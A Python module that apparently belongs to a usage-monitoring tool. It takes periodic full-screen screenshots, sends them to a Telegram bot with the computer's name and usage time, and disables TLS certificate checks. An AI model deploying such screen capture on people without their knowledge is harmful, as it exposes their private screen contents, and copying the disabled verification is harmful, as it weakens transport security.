# screenshot_sender.py

import os
import time
import configparser
import requests
from PIL import ImageGrab
import logging
import socket
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
class ScreenshotSender:
    def __init__(self, usage_tracker=None):
        self.logger = logging.getLogger("ScreenshotSender")
        self.usage_tracker = usage_tracker  # 新增：接收UsageTracker实例

        # 读取配置文件
        self.config = configparser.ConfigParser()
        if not os.path.exists('config.ini'):
            self.logger.error("config.ini not found!")
            raise FileNotFoundError("config.ini not found")

        try:
            self.config.read('config.ini')
            # 从配置文件获取参数
            self.data_folder = self.config.get('Settings', 'dataFolder')
            self.bot_token = self.config.get('Settings', 'botToken')
            self.chat_id = self.config.get('Settings', 'chatId')
            self.proxy = self.config.get('Settings', 'proxy', fallback='')
            self.interval = self.config.getint('Settings', 'screenshotInterval', fallback=1) * 60
            self.show_float_window = self.config.getboolean('Settings', 'showFloatWindow', fallback=True)
        except Exception as e:
            self.logger.error(f"Error reading config.ini: {str(e)}")
            raise

        # 确保数据文件夹存在
        os.makedirs(self.data_folder, exist_ok=True)
        self.filename = os.path.join(self.data_folder, "xy.jpg")

        # 设置代理
        self.proxies = {}
        if self.proxy:
            self.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }

    def take_screenshot(self):
        """截取屏幕并保存到文件"""
        try:
            self.logger.info("Taking a screenshot...")
            screenshot = ImageGrab.grab()
            screenshot.save(self.filename)
            time.sleep(3)  # 等待确保截图完成
            return os.path.exists(self.filename)
        except Exception as e:
            self.logger.error(f"Error taking screenshot: {str(e)}")
            return False

    def send_screenshot(self, usage_time=0):
        """发送截图到Telegram并添加使用时间信息"""
        try:
            # 截图
            if not self.take_screenshot():
                self.logger.error("Failed to take screenshot")
                return False

            # 获取本地计算机名
            computer_name = socket.gethostname()

            # 检查文件并发送
            if os.path.exists(self.filename):
                self.logger.info("Sending photo...")
                url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"

                # 修改：使用计算机名替代固定文本
                usage_message = f"{computer_name}: {self.format_time(usage_time)}"
                self.logger.info(f"Sending message: {usage_message}")

                with open(self.filename, 'rb') as file:
                    files = {'document': file}
                    data = {'chat_id': self.chat_id, 'caption': usage_message}

                    # 发送请求，带重试机制
                    for attempt in range(3):
                        try:
                            response = requests.post(url, data=data, files=files,
                                                     proxies=self.proxies, verify=False, timeout=60)
                            response.raise_for_status()
                            self.logger.info("Photo sent successfully")

                            # 新增：发送成功后保存使用时间
                            if self.usage_tracker:
                                self.usage_tracker.save_usage_stats()
                                self.logger.info("Usage stats saved after sending screenshot")

                            break
                        except requests.exceptions.RequestException as e:
                            self.logger.warning(f"Send attempt {attempt + 1} failed: {str(e)}")
                            if attempt == 2:
                                self.logger.error("Max retries reached, giving up")
                                return False

                # 删除截图文件
                os.remove(self.filename)
                self.logger.info("Photo deleted")
                return True
            else:
                self.logger.error("Screenshot file does not exist")
                return False

        except Exception as e:
            self.logger.error(f"Error sending screenshot: {str(e)}")
            return False

    def format_time(self, seconds):
        """将秒数格式化为HH:MM:SS格式"""
        hours, remainder = divmod(int(seconds), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"